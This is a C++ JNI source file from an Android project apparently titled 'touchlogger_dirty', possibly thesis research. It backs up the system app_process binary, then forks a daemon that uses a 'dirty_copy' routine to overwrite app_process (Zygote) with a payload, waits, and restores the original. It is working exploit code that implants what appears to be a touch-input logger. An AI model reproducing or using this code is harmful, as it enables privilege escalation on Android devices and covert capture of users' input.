#include <jni.h>
#include <string>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

#include "dirty/file_utils/file_utils.h"
#include "dirty/file_utils/dirty_copy.h"
#include "dirty/common/logging.h"

#ifdef __aarch64__
#define APP_PROCESS_PATH "/system/bin/app_process64"
#else
#define APP_PROCESS_PATH "/system/bin/app_process32"
#endif

#define APP_PROCESS_FALLBACK_PATH "/system/bin/app_process"

#define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/exec_payload"

// TODO: make this depend on build type
#define DEBUG 1

char app_process_backup_path[PATH_MAX];
char exec_payload_path[PATH_MAX];
char payload_path[PATH_MAX];
char app_process_remote_path[PATH_MAX];

extern "C"
JNIEXPORT jboolean JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_prepare(JNIEnv* env, jclass type,
                                                               jstring localPath_)
{
  const char* localPath = env->GetStringUTFChars(localPath_, 0);

  snprintf(app_process_backup_path, PATH_MAX, "%s/%s", localPath, "app_process.bak");
  snprintf(exec_payload_path, PATH_MAX, "%s/%s", localPath, "exec_payload");
  snprintf(payload_path, PATH_MAX, "%s/%s", localPath, "payload");

  struct stat st;
  if (stat(APP_PROCESS_PATH, &st) == 0)
  {
    snprintf(app_process_remote_path, PATH_MAX, "%s", APP_PROCESS_PATH);
  } else {
    snprintf(app_process_remote_path, PATH_MAX, "%s", APP_PROCESS_FALLBACK_PATH);
  }

  LOGV("Backup app_process...");
  if (copy_file_with_mode(app_process_remote_path, app_process_backup_path, 0777) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }
  LOGV("Done!");

  LOGV("Move exec_payload to external memory...");
  if (copy_file(exec_payload_path, EXEC_PAYLOAD_SDCARD_PATH) == -1)
  {
    LOGV("Failed!");
    return (jboolean) false;
  }
  LOGV("Done!");

  env->ReleaseStringUTFChars(localPath_, localPath);

  return (jboolean) true;
}

extern "C"
JNIEXPORT void JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_triggerLogger(JNIEnv* env, jclass type)
{
  if (fork() == 0)
  {
    if (daemon(0, 0) == -1)
    {
      LOGV("Unable to daemonize process: %s!", strerror(errno));
    }
    else
    {
      LOGV("Start as daemon!");
    }

    int killer_pid;
    if ((killer_pid = fork()) == 0)
    {
      if (dirty_copy(payload_path, app_process_remote_path) == -1)
      {
        LOGV("Unable to overwrite app_process (%s) with %s!", app_process_remote_path, payload_path);
        exit(-1);
      }
      else
      {
        LOGV("App_process successfully overwritten!");
      }

      exit(0);
    }

    //FIXME: come up with something less dumb than that
    sleep(10);

    LOGV("Zygote is probably overwritten now");

    if (kill(killer_pid, SIGKILL) == -1)
    {
      LOGV("Unable to kill killer thread: %s", strerror(errno));
    }
    else
    {
      LOGV("Killer process killed successfully!");
    }

    if (dirty_copy(app_process_backup_path, app_process_remote_path) == -1)
    {
      LOGV("Unable to restore app_process from backup! Reboot yor device and try again.");
      exit(-1);
    }
    else
    {
      LOGV("Zygote successfully restarted!");
    }

    LOGV("Done!");
    exit(0);
  }
}

extern "C"
JNIEXPORT jstring JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_stringFromJNI(JNIEnv* env,
                                                                     jobject instance)
{
  std::string hello = "Hello from C++";
  return env->NewStringUTF(hello.c_str());
}
